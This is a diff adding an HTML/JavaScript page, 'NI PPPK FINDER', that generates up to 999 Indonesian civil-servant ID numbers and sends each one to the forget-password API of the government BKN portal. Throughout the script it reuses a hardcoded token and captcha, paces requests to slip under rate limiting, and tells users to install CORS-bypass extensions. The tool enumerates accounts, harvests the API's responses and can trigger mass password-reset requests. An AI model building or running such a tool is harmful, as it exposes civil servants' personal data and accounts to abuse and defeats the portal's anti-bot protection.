@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NI PPPK FINDER</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 900px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .range-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .output {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .output.show {
+            display: block;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .fetch-btn {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+        }
+
+        .fetch-btn:hover {
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
+        }
+
+        .stop-btn {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+
+        .stop-btn:hover {
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.4);
+        }
+
+        .stats {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .stats-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .stats-info {
+            color: #555;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .copy-all-btn {
+            padding: 8px 20px;
+            width: auto;
+            font-size: 14px;
+        }
+
+        .links-container {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .link-item {
+            background: white;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 6px;
+            border-left: 4px solid #ddd;
+        }
+
+        .link-item.fetching {
+            border-left-color: #ffc107;
+            background: #fff9e6;
+        }
+
+        .link-item.success {
+            border-left-color: #28a745;
+            background: #f0f9f4;
+        }
+
+        .link-item.error {
+            border-left-color: #dc3545;
+            background: #fff5f5;
+        }
+
+        .nip-display {
+            font-weight: 700;
+            color: #667eea;
+            margin-bottom: 8px;
+            font-size: 14px;
+            padding: 8px;
+            background: #f0f2ff;
+            border-radius: 4px;
+            display: inline-block;
+        }
+
+        .link-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .link-text {
+            flex: 1;
+            word-break: break-all;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .link-status {
+            font-size: 11px;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .status-pending {
+            background: #e9ecef;
+            color: #6c757d;
+        }
+
+        .status-fetching {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .json-response {
+            margin-top: 10px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .json-response.show {
+            display: block;
+        }
+
+        .json-response pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .copy-btn {
+            padding: 6px 15px;
+            width: auto;
+            font-size: 12px;
+            background: #28a745;
+            white-space: nowrap;
+        }
+
+        .copy-btn:hover {
+            background: #218838;
+        }
+
+        .error {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .success-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+
+        .success-toast.show {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔗 NI PPPK FINDER</h1>
+        <p class="subtitle">Created by Muif Aha</p>
+
+        <div class="input-group">
+            <label for="baseDigits">15 Digit Angka Dasar:</label>
+            <input type="text" id="baseDigits" placeholder="Contoh: 199312282025212" maxlength="15">
+            <span class="error" id="baseError"></span>
+        </div>
+
+        <div class="input-group">
+            <label for="token">Token:</label>
+            <input type="text" id="token" value="$2b$10$.9ehUjHkAGEMeMLdUh3.teDmqNaU9o3QVt7xdFv9elaEGoek03cRu">
+        </div>
+
+        <div class="input-group">
+            <label for="captcha">Captcha:</label>
+            <input type="text" id="captcha" value="sL2c">
+        </div>
+
+        <div class="input-group">
+            <label>Range 3 Digit (001-999):</label>
+            <div class="range-group">
+                <div>
+                    <input type="number" id="rangeStart" placeholder="Dari (1)" min="1" max="999" value="1">
+                </div>
+                <div>
+                    <input type="number" id="rangeEnd" placeholder="Sampai (999)" min="1" max="999" value="999">
+                </div>
+            </div>
+            <span class="error" id="rangeError"></span>
+        </div>
+
+        <button onclick="generateLinks()">🚀 Generate Links</button>
+
+        <div class="output" id="output">
+            <div class="action-buttons">
+                <button class="fetch-btn" onclick="fetchAllLinks()" id="fetchBtn">🌐 Fetch Semua Link</button>
+                <button class="fetch-btn" onclick="openAllLinks()" id="openBtn">🔗 Open All Links</button>
+                <button class="stop-btn" onclick="stopFetching()" id="stopBtn" style="display:none;">⏹️ Stop</button>
+            </div>
+            <div class="stats">
+                <div class="stats-row">
+                    <div class="stats-info">
+                        <strong>Total Link:</strong> <span id="totalLinks">0</span>
+                    </div>
+                    <button class="copy-all-btn" onclick="copyAllLinks()">📋 Copy Semua</button>
+                </div>
+                <div class="stats-row" id="fetchStats" style="display:none;">
+                    <div class="stats-info">
+                        <strong>Progress:</strong> 
+                        <span id="fetchedCount">0</span> / <span id="totalCount">0</span>
+                        (<span id="successCount">0</span> sukses, <span id="errorCount">0</span> error)
+                    </div>
+                </div>
+                <div class="progress-bar" id="progressBar" style="display:none;">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+            <div class="links-container" id="linksContainer"></div>
+        </div>
+    </div>
+
+    <div class="success-toast" id="toast">Link berhasil disalin!</div>
+
+    <script>
+        let allLinks = [];
+        let isFetching = false;
+        let shouldStop = false;
+
+        function validateInputs() {
+            let isValid = true;
+            
+            const baseDigits = document.getElementById('baseDigits').value;
+            const baseError = document.getElementById('baseError');
+            
+            if (baseDigits.length !== 15 || !/^\d+$/.test(baseDigits)) {
+                baseError.textContent = 'Harus 15 digit angka!';
+                isValid = false;
+            } else {
+                baseError.textContent = '';
+            }
+
+            const rangeStart = parseInt(document.getElementById('rangeStart').value);
+            const rangeEnd = parseInt(document.getElementById('rangeEnd').value);
+            const rangeError = document.getElementById('rangeError');
+
+            if (rangeStart < 1 || rangeStart > 999 || rangeEnd < 1 || rangeEnd > 999) {
+                rangeError.textContent = 'Range harus antara 1-999!';
+                isValid = false;
+            } else if (rangeStart > rangeEnd) {
+                rangeError.textContent = 'Angka awal harus lebih kecil dari angka akhir!';
+                isValid = false;
+            } else {
+                rangeError.textContent = '';
+            }
+
+            return isValid;
+        }
+
+        function generateLinks() {
+            if (!validateInputs()) {
+                return;
+            }
+
+            const baseDigits = document.getElementById('baseDigits').value;
+            const token = document.getElementById('token').value;
+            const captcha = document.getElementById('captcha').value;
+            const rangeStart = parseInt(document.getElementById('rangeStart').value);
+            const rangeEnd = parseInt(document.getElementById('rangeEnd').value);
+
+            allLinks = [];
+            
+            for (let i = rangeStart; i <= rangeEnd; i++) {
+                const suffix = String(i).padStart(3, '0');
+                const username = baseDigits + suffix;
+                const link = `https://asndigital.bkn.go.id/api/forget-password?username=${username}&token=${encodeURIComponent(token)}&captcha=${captcha}`;
+                allLinks.push({
+                    url: link,
+                    username: username,
+                    status: 'pending',
+                    response: null,
+                    error: null
+                });
+            }
+
+            displayLinks();
+        }
+
+        function displayLinks() {
+            const output = document.getElementById('output');
+            const linksContainer = document.getElementById('linksContainer');
+            const totalLinks = document.getElementById('totalLinks');
+
+            totalLinks.textContent = allLinks.length;
+            linksContainer.innerHTML = '';
+
+            allLinks.forEach((linkData, index) => {
+                const linkItem = document.createElement('div');
+                linkItem.className = 'link-item';
+                linkItem.id = `link-${index}`;
+                linkItem.innerHTML = `
+                    <div class="nip-display">NIP: ${linkData.username}</div>
+                    <div class="link-header">
+                        <div class="link-text">${linkData.url}</div>
+                        <span class="link-status status-${linkData.status}">${getStatusText(linkData.status)}</span>
+                    </div>
+                    <div class="json-response" id="json-${index}"></div>
+                `;
+                linksContainer.appendChild(linkItem);
+            });
+
+            output.classList.add('show');
+            resetFetchUI();
+        }
+
+        function getStatusText(status) {
+            const statusMap = {
+                'pending': 'Pending',
+                'fetching': 'Fetching...',
+                'success': 'Success',
+                'error': 'Error'
+            };
+            return statusMap[status] || status;
+        }
+
+        async function fetchAllLinks() {
+            if (isFetching) return;
+            if (allLinks.length === 0) {
+                alert('Generate links terlebih dahulu!');
+                return;
+            }
+
+            // Tampilkan peringatan CORS
+            const confirmFetch = confirm(
+                '⚠️ PERHATIAN:\n\n' +
+                'Fitur auto-fetch mungkin diblokir oleh CORS policy dari server.\n\n' +
+                'SOLUSI ALTERNATIF:\n' +
+                '1. Instal ekstensi browser "CORS Unblock" atau "Allow CORS"\n' +
+                '2. Gunakan mode "Open Link" untuk membuka link satu per satu di tab baru\n' +
+                '3. Copy semua link dan akses manual\n\n' +
+                'Tetap lanjutkan fetch?'
+            );
+
+            if (!confirmFetch) return;
+
+            isFetching = true;
+            shouldStop = false;
+            
+            document.getElementById('fetchBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('fetchStats').style.display = 'block';
+            document.getElementById('progressBar').style.display = 'block';
+            document.getElementById('totalCount').textContent = allLinks.length;
+
+            let fetched = 0;
+            let success = 0;
+            let errors = 0;
+
+            for (let i = 0; i < allLinks.length; i++) {
+                if (shouldStop) break;
+
+                const linkData = allLinks[i];
+                updateLinkStatus(i, 'fetching');
+
+                try {
+                    // Coba dengan mode no-cors terlebih dahulu
+                    const response = await fetch(linkData.url, {
+                        method: 'GET',
+                        mode: 'cors',
+                        credentials: 'omit',
+                        headers: {
+                            'Accept': 'application/json',
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        linkData.response = data;
+                        linkData.status = 'success';
+                        updateLinkStatus(i, 'success', data);
+                        success++;
+                    } else {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+                } catch (error) {
+                    linkData.error = error.message;
+                    linkData.status = 'error';
+                    
+                    // Tampilkan info CORS jika error adalah CORS
+                    let errorMsg = error.message;
+                    if (errorMsg.includes('Failed to fetch') || errorMsg.includes('CORS')) {
+                        errorMsg = 'CORS Error - Gunakan ekstensi CORS Unblock atau buka link manual';
+                    }
+                    
+                    updateLinkStatus(i, 'error', null, errorMsg);
+                    errors++;
+                }
+
+                fetched++;
+                updateProgress(fetched, success, errors);
+
+                // Delay 300ms untuk menghindari rate limiting
+                await new Promise(resolve => setTimeout(resolve, 300));
+            }
+
+            isFetching = false;
+            document.getElementById('fetchBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+
+            // Tampilkan ringkasan
+            if (errors > 0 && success === 0) {
+                alert(
+                    '❌ Semua request gagal karena CORS!\n\n' +
+                    'SOLUSI:\n' +
+                    '1. Install ekstensi: "Allow CORS: Access-Control-Allow-Origin"\n' +
+                    '2. Atau gunakan tombol "Open All Links" untuk buka manual\n' +
+                    '3. Atau akses link satu per satu'
+                );
+            }
+        }
+
+        function stopFetching() {
+            shouldStop = true;
+            isFetching = false;
+            document.getElementById('fetchBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+        }
+
+        function updateLinkStatus(index, status, response = null, error = null) {
+            const linkItem = document.getElementById(`link-${index}`);
+            const jsonDiv = document.getElementById(`json-${index}`);
+            
+            linkItem.className = `link-item ${status}`;
+            
+            const statusSpan = linkItem.querySelector('.link-status');
+            statusSpan.className = `link-status status-${status}`;
+            statusSpan.textContent = getStatusText(status);
+
+            if (response) {
+                jsonDiv.innerHTML = `<pre>${JSON.stringify(response, null, 2)}</pre>`;
+                jsonDiv.classList.add('show');
+            } else if (error) {
+                jsonDiv.innerHTML = `<pre style="color: #dc3545;">Error: ${error}</pre>`;
+                jsonDiv.classList.add('show');
+            }
+        }
+
+        function updateProgress(fetched, success, errors) {
+            document.getElementById('fetchedCount').textContent = fetched;
+            document.getElementById('successCount').textContent = success;
+            document.getElementById('errorCount').textContent = errors;
+            
+            const progress = (fetched / allLinks.length) * 100;
+            document.getElementById('progressFill').style.width = `${progress}%`;
+        }
+
+        function resetFetchUI() {
+            document.getElementById('fetchStats').style.display = 'none';
+            document.getElementById('progressBar').style.display = 'none';
+            document.getElementById('fetchedCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            document.getElementById('progressFill').style.width = '0%';
+        }
+
+        function copyLink(link) {
+            navigator.clipboard.writeText(link).then(() => {
+                showToast();
+            });
+        }
+
+        function copyAllLinks() {
+            const links = allLinks.map(l => l.url).join('\n');
+            
+            navigator.clipboard.writeText(links).then(() => {
+                showToast('Semua link berhasil disalin!');
+            });
+        }
+
+        function showToast(message = 'Link berhasil disalin!') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+
+        function openAllLinks() {
+            if (allLinks.length === 0) {
+                alert('Generate links terlebih dahulu!');
+                return;
+            }
+
+            const confirmOpen = confirm(
+                `⚠️ Akan membuka ${allLinks.length} tab baru di browser!\n\n` +
+                'Browser mungkin memblokir popup.\n' +
+                'Pastikan izinkan popup untuk situs ini.\n\n' +
+                'Lanjutkan?'
+            );
+
+            if (!confirmOpen) return;
+
+            let opened = 0;
+            const maxBatch = 10; // Buka maksimal 10 tab per batch
+
+            function openBatch(startIndex) {
+                const endIndex = Math.min(startIndex + maxBatch, allLinks.length);
+                
+                for (let i = startIndex; i < endIndex; i++) {
+                    window.open(allLinks[i].url, '_blank');
+                    opened++;
+                }
+
+                if (endIndex < allLinks.length) {
+                    // Delay 2 detik sebelum batch berikutnya
+                    setTimeout(() => {
+                        const continueOpen = confirm(
+                            `Sudah membuka ${opened} dari ${allLinks.length} link.\n\n` +
+                            'Lanjutkan membuka sisanya?'
+                        );
+                        if (continueOpen) {
+                            openBatch(endIndex);
+                        }
+                    }, 2000);
+                } else {
+                    showToast(`Berhasil membuka ${opened} link!`);
+                }
+            }
+
+            openBatch(0);
+        }
+    </script>
+</body>
+</html>
